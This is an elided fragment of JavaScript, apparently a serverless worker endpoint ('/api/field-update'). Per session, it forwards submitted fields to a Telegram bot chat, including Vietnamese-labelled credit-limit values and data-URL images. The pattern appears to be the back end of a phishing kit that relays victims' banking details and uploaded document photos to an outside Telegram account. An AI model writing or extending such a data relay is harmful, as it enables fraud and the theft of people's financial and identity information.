...
async function handleRequest(request) {
  ...
  if (url.pathname === '/api/field-update' && request.method === 'POST') {
    try {
      ...
      if (!sessionId)
        return new Response(JSON.stringify({ status: 'err', error: 'missing_sessionId' }), {
          status: 400,
          headers: { 'Content-Type': 'application/json' },
        });
      ...
      if (payload.limitGranted !== undefined)
        lines.push(
          `H\u1ea1n M\u1ee9c \u0111\u01b0\u1ee3c C\u1ea5p: <code>${payload.limitGranted}</code>`
        );
      if (payload.limitAvailable !== undefined)
        lines.push(`H\u1ea1n M\u1ee9c Kh\u1ea3 D\u1ee5ng: <code>${payload.limitAvailable}</code>`);
      ...
      const token =
        typeof TELEGRAM_BOT_TOKEN !== 'undefined' && TELEGRAM_BOT_TOKEN
          ? TELEGRAM_BOT_TOKEN
          : typeof TELEGRAM_TOKEN !== 'undefined'
          ? TELEGRAM_TOKEN
          : null;
      const chatId =
      ...
      if (!token || !chatId) {
        return new Response(JSON.stringify({ status: 'err', error: 'missing_telegram_secrets' }), {
          status: 500,
          headers: { 'Content-Type': 'application/json' },
        });
      }
      ...
      for (const k of Object.keys(payload)) {
        ...
        if (typeof v === 'string' && v.startsWith('data:')) {
          ...
          if (!r || r.error)
            results.errors.push({ field: k, error: r && r.error ? r.error : 'unknown' });
          sentImages++;
        }
